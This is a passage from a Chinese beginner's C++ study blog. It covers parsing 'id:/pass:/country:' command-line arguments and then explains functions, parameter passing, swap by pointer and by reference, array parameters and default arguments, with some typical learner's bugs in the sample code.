class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">serachChar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *findstr)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *ch;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] != findstr[i])&#123;</span><br><span class="line">            ch += str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里肯定是不对的，因为指针没有初始化。。编译不通过。你也不知道到底该分配多少个内存。<br>那就不能用额外声明的指针返回，直接返回str[]从什么位置开始返回好像会更好<br>但是这样的话就要判断什么时候返回，返回的位置怎么计算合适。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">serachChar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *findstr)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == findstr[i])&#123;</span><br><span class="line">            x++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> (<span class="type">char</span>*)&amp;str[x + (i-x)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>试了大半天，测了几个样例，能得到正常的值了</p><ol><li>首先需要一个x，这个x是累计str和findstr有几个相同的元素</li><li>考虑到for循环里面else就应能返回一个正确值了，那么最外层必须要有一个返回值的前提就返回一个空指针</li><li>for循环使用str[i]是因为字符串以0结尾，效果一样，就是到头了就表示false了。</li><li>return (char*)&amp;str[x+(i-x)]是因为假设x&#x3D;2，那么下一次i&#x3D;3的时候其实就可以返回后面的地址了。表达式写成x+(i-x),其实就是2+1…等会我直接用i好像就行了。</li></ol></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">serachChar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *findstr)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == findstr[i])&#123;</span><br><span class="line">            x++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> (<span class="type">char</span>*)&amp;str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>return (char*)&amp;str[i]; i就行了，不用整表达式了。</p></blockquote><p>然后就是用命令行的方式去实现。不过要在main函数里先赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *idN = <span class="string">&quot;id:&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *passN = <span class="string">&quot;pass:&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *countryN = <span class="string">&quot;country:&quot;</span>;</span><br><span class="line"><span class="type">char</span> *id&#123;&#125;, *pass&#123;&#125;, *country&#123;&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先定义需要的变量。<br>然后for循环argv使用自定义函数赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; argv[i]; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        id = <span class="built_in">serachChar</span>(argv[i], idN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pass == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        pass = <span class="built_in">serachChar</span>(argv[i], passN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (country == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        country = <span class="built_in">serachChar</span>(argv[i], countryN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>i&#x3D;1是因为0是程序名，不需要进行判断，直接忽略就行，我们要截取的是后面的参数<br>id，pass，country默认都是空指针，当他们&#x3D;&#x3D;nullptr的时候，就进行serachChar。<br>不过这样的话当三个参数时，argv[1]走了三遍，[2]走了两遍，[3]走了一遍，但if都是重复判断了，又有点麻烦。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; argv[i]; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        id = <span class="built_in">serachChar</span>(argv[i], idN);</span><br><span class="line">        <span class="keyword">if</span> (id != <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pass == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        pass = <span class="built_in">serachChar</span>(argv[i], passN);</span><br><span class="line">        <span class="keyword">if</span> (pass != <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (country == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        country = <span class="built_in">serachChar</span>(argv[i], countryN);</span><br><span class="line">        <span class="keyword">if</span> (country != <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考了视频，在赋值后，判断不为空就continue也不失为一种办法，目前没想到啥好主意就先用了。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; id &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; pass &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; country &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><blockquote><p>输出就不用干啥了，然后就编译一下，发现不通过，这个程序没用明面上的输入就输出值好像不允许。<br>视频是通过(int)强转三个指针然后相乘，因为不为空都是有值的存在，故此if也能通过</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)id * (<span class="type">int</span>)pass * (<span class="type">int</span>)country)&#123;</span><br><span class="line">    std::cout &lt;&lt; id &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; pass &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; country &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑到终端尝试：<img src="/2022/05/28/functionTest/000.png" class=""><br>结果是正常的，然后再看看有啥能优化的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">serachChar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *findstr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] != findstr[i])&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">char</span>*)&amp;str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其实也挺好整的，因为我们之前实现比较相同部分，再去返回相同之后的部分，那么换算过来直接返回当两个字符串不相等的位置就可以了。</p></blockquote><p>重新编译之后运行也是正确的：</p><img src="/2022/05/28/functionTest/001.png" class=""><p>然后就可以告一段落了，自己写一个功能其实会小有成就感。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>大半夜想了半天，看了眼视频发现路数差不多。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function</title>
      <link href="/2022/05/27/function/"/>
      <url>/2022/05/27/function/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>函数是指一段可以直接被另一段程序或代码引用的程序或代码。也叫做子程序、（OOP中）方法。<br>在程序设计中，常将一些常用的功能模块编写成函数，放在函数库中供公共选用。要善于利用函数，以减少重复编写程序段的工作量。</p><span id="more"></span><p>函数分为全局函数、全局静态函数；在类中还可以定义构造函数、析构函数、拷贝构造函数、成员函数、友元函数、运算符重载函数、内联函数等。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>简而言之就是封装好的功能，通过特定方法调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  返回类型 函数名(参数，可以没有，也可以一到多个)&#123;</span></span><br><span class="line"><span class="comment"> *      功能区，需要实现的代码</span></span><br><span class="line"><span class="comment"> *      return 返回值； //如果是void类型的函数，则不需要return  </span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintHe</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; ch &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类型可以各式各样，但是要有准确结果和一定的复用性，不然写着也没啥用处。</p><hr><h2 id="自定义函数声明前后问题"><a href="#自定义函数声明前后问题" class="headerlink" title="自定义函数声明前后问题"></a>自定义函数声明前后问题</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">add</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种情况下，自定义函数写在main函数之前，则不需要额外的单独声明</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//或者在此处声明int add(int a, int b);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">add</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>假如实现的部分写在main函数之后，则需在main函数之前声明一个模板，或者在main函数内声明，区别就在于作用域不一样，在main函数之外声明的具有全局性，main函数之内声明的就是局部函数。<br>但其实不跨文件，终归都是在main函数里面运行，写在外面主要是好区分吧。</p></blockquote><hr><h2 id="形参与实参"><a href="#形参与实参" class="headerlink" title="形参与实参"></a>形参与实参</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：这里的变量a和变量b实际上是不存在的，它只是一个类型参照，只有当你的形参被调用才会分配内存，调用完后立刻释放，所以形参只在函数内有效，并且你传递的变量跟a和b重名也没有关系<br>故此，我们称函数里的参数为形式参数，这里简称形参</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> k = <span class="built_in">add</span>(i, j);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>此处的i和j，是实质的变量，它俩声明的时候就占用了内存空间，进行函数传递的时候，他俩就是实际参数，简称实参<br>在此处也要引出另一个点，实参传递给形参的只是一个值，这个值在函数内怎么变化都不会影响实参。</p></blockquote><hr><h2 id="经典swap问题"><a href="#经典swap问题" class="headerlink" title="经典swap问题"></a>经典swap问题</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">swap</span>(a,b);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;,b=  &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在形参和实参的时候解释过了，实参传递给形参的时候，只是传递了值。就是相当于激活了形参，形参拥有的只是实参的值，用完形参就释放了。所以这里a和b并不会交换值。<br>但如果想要真的交换两个变量的值，就需要对它的地址进行操作</p></blockquote><h3 id="C语言swap"><a href="#C语言swap" class="headerlink" title="C语言swap"></a>C语言swap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">    swap(&amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;,b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/27/function/000.png" class=""><blockquote><p>C语言没有引用这个特性，所以依靠的是指针<br>而c++则都可以实现</p></blockquote><hr><h2 id="数组参数"><a href="#数组参数" class="headerlink" title="数组参数"></a>数组参数</h2><p>上述的swap问题所使用的形参是指针类型，此处提及数组参数的时候</p><p>参数为数组时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sortInt</span><span class="params">(<span class="type">int</span> ch[])</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里需要强调一个问题，就是印象中，声明数组必须指定大小，除非是初始化的时候写好了。<br>那么作为形参的数组为什么不需要指定大小？<br>底层中，数组就是指针实现的，所以c语言和c++在编译的时候不对形参数组大小做检查，因为形参接受到的是实参的首地址！</p></blockquote><p>不信的话可以sizeof查看这个数组的大小：</p><img src="/2022/05/27/function/001.png" class=""><p>如果你以为这是变量类型的大小就错了！此处是在x86情况下的指针大小，我们再看x64下：</p><img src="/2022/05/27/function/002.png" class=""><p>发现结果是8，这也就是表明了这个大小代表的是指针的大小。</p><p>提到soft，我们可以配合冒泡排序对数组进行排序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sortInt</span><span class="params">(<span class="type">int</span> ch[], <span class="type">unsigned</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len - i - <span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (ch[j] &lt; ch[j + <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> tmp = ch[j];</span><br><span class="line">                ch[j] = ch[j + <span class="number">1</span>];</span><br><span class="line">                ch[j + <span class="number">1</span>] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> ch1[<span class="number">5</span>]&#123; <span class="number">100</span>,<span class="number">20</span>,<span class="number">25</span>,<span class="number">58</span>,<span class="number">79</span> &#125;;</span><br><span class="line">    <span class="built_in">sortInt</span>(ch1,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> n : ch1) std::cout &lt;&lt; n &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为：<img src="/2022/05/27/function/003.png" class=""></p><p>可以先不管算法，我们看到排序的时候函数形参除了数组还有个长度，当在我们印象里数组的长度似乎可以通过<code>sizeof(ch)/sizeof(ch[0])</code>得到，但是这里为什么不能这么写。</p><ol><li>我们之前说过，形参数组接收到的是实参的地址，也就是指针，而指针在x86下占用4字节，x64下占用8字节，当处于x86环境下，<code>sizeof(ch)/sizeof(ch[0])</code>就变成了4&#x2F;4 &#x3D; 1；故此循环就没能跑起来。不信邪的可以debug测试看这句表达式的值。</li></ol><p>然后就是模板问题，数组底层是指针，但是在设置形参的时候，使用数组和指针给人的第一印象是不一样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sortInt</span><span class="params">(<span class="type">int</span> ch[], <span class="type">unsigned</span> len)</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sortInt</span><span class="params">(<span class="type">int</span> *ch, <span class="type">unsigned</span> len)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再不看函数名的情况下，只看形参，不一定就能看出第二个函数是干什么的。<br>当然效果都是一样的，只是在可阅读性上，我们尽量不为难自己人</p></blockquote><p>然后是多维数组，例如二维：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sortInt</span><span class="params">(<span class="type">int</span> ch[][], <span class="type">unsigned</span> len)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这种写法肯定就不合适了！</strong><br>学过数组的都知道，二维数组可以不声明有多少行，但是要声明多少列，从实参传递来的是数组的起始地址，在内存中按数组排列规则存放(按⾏存放)，⽽并不区分⾏和列，如果在形参中不说明列数，则系统⽆法决定应为多少⾏多少列，不能只指定⼀维⽽不指定第⼆维<br>形参是实参的模板，所以形参肯定也要是合法的。</p><hr><h2 id="引用参数"><a href="#引用参数" class="headerlink" title="引用参数"></a>引用参数</h2><p>引用就是<code>int &amp;a = b;</code>，放到函数里</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">(<span class="type">int</span> &amp;n)</span></span>&#123;</span><br><span class="line">    n = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用变量可以修改被引用的变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">hhh</span>(a);</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/05/27/function/004.png" class=""><br>如果不想被修改，那就只有在类型前加上const限定为常量。</p><p>之前提到过引用其实就是弱化的指针，放到形参上他俩的区别就是指针可以传入nullptr，也就是空指针；而引用不能传入nullptr。因为引用是必然要初始化的，指针稍不留神就会漏掉。</p><blockquote><p>引用作为参数的时候，对于结构体才会用的比较多，现在的体会比较少</p></blockquote><p>不过对于swap函数，引用就派上用场了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> &amp;a,<span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果也是一样的，对比指针还要用*号取值时更直观点。</p><hr><h2 id="默认实参"><a href="#默认实参" class="headerlink" title="默认实参"></a>默认实参</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hh</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">bool</span> d)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>我们在声明函数的时候，形参是各式各样的，但是针对一些值，比如布尔类型，他就两种结果，有的时候我们就想不声明了，让他默认有一个值，方法也很简单：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hh</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">bool</span> d=<span class="literal">true</span>)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>不想额外声明的可以提前定义一个值作为默认参数<br><strong>注：默认参数可以有多个但只能放在最后面，否则调用函数时hh(1,3, ,3)在中间留空，则导致参数不匹配了。但如果形参都设置了默认值那也无可厚非，参数自然能匹配上</strong></p><hr><h2 id="不定量参数"><a href="#不定量参数" class="headerlink" title="不定量参数"></a>不定量参数</h2><p>学网络的时候常在cmd中用ping命令，ping是人为写好的功能，一般存放在<code>C:/Windows/</code>下，ping 